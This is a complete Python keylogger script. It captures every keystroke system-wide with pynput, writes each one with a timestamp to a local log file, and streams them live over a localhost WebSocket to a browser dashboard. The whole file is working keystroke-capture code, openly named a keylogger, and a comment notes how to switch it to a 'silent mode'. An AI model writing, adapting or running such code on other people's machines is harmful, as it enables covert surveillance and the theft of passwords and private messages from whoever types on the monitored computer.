"""
keylogger.py — Windows Keystroke Logger with WebSocket Server
=============================================================
Captures every keystroke system-wide and broadcasts them to
connected WebSocket clients (the dashboard).

Requirements:
    pip install pynput websockets

Usage:
    python keylogger.py

Then open dashboard.html in your browser.
Logs are also saved to keylog.txt in the same directory.
"""

import asyncio
import json
import datetime
import threading
from pathlib import Path
from pynput import keyboard
import websockets

# ── Config ──────────────────────────────────────────────────
WS_HOST = "localhost"
WS_PORT = 8765
LOG_FILE = Path("keylog.txt")

# ── State ────────────────────────────────────────────────────
connected_clients: set = set()
loop: asyncio.AbstractEventLoop = None


# ── Helpers ──────────────────────────────────────────────────
def format_key(key) -> dict:
    """Turn a pynput key event into a JSON-serialisable dict."""
    now = datetime.datetime.now()
    try:
        char = key.char  # regular character
        display = char if char is not None else "?"
        key_type = "char"
    except AttributeError:
        # Special key (shift, enter, backspace, …)
        display = str(key).replace("Key.", "").upper()
        key_type = "special"

    return {
        "key": display,
        "type": key_type,
        "timestamp": now.strftime("%H:%M:%S"),
        "date": now.strftime("%Y-%m-%d"),
    }


def append_to_log(entry: dict):
    """Append the key event to the log file."""
    line = f"[{entry['date']} {entry['timestamp']}] {entry['key']}\n"
    with LOG_FILE.open("a", encoding="utf-8") as f:
        f.write(line)


def broadcast(entry: dict):
    """Thread-safe broadcast to all connected WebSocket clients."""
    if loop is None or not connected_clients:
        return
    payload = json.dumps(entry)
    asyncio.run_coroutine_threadsafe(_broadcast(payload), loop)


async def _broadcast(payload: str):
    dead = set()
    for ws in connected_clients:
        try:
            await ws.send(payload)
        except Exception:
            dead.add(ws)
    connected_clients.difference_update(dead)


# ── Keyboard listener ────────────────────────────────────────
def on_press(key):
    entry = format_key(key)
    append_to_log(entry)
    broadcast(entry)
    # Console echo (optional — comment out for silent mode)
    print(f"[{entry['timestamp']}] {entry['key']}")


def start_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


# ── WebSocket server ─────────────────────────────────────────
async def handler(websocket):
    connected_clients.add(websocket)
    print(f"[WS] Client connected  ({len(connected_clients)} total)")
    try:
        # Send a welcome/ping so the dashboard knows it's live
        await websocket.send(json.dumps({
            "key": "●  CONNECTED",
            "type": "system",
            "timestamp": datetime.datetime.now().strftime("%H:%M:%S"),
            "date": datetime.datetime.now().strftime("%Y-%m-%d"),
        }))
        await websocket.wait_closed()
    finally:
        connected_clients.discard(websocket)
        print(f"[WS] Client disconnected ({len(connected_clients)} total)")


async def main():
    global loop
    loop = asyncio.get_running_loop()

    # Start keyboard listener in a background thread
    t = threading.Thread(target=start_listener, daemon=True)
    t.start()

    print(f"[*] Keylogger started.  Logging to → {LOG_FILE.resolve()}")
    print(f"[*] WebSocket listening on  ws://{WS_HOST}:{WS_PORT}")
    print("[*] Open dashboard.html in your browser.")
    print("[*] Press Ctrl+C to stop.\n")

    async with websockets.serve(handler, WS_HOST, WS_PORT):
        await asyncio.Future()  # run forever


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
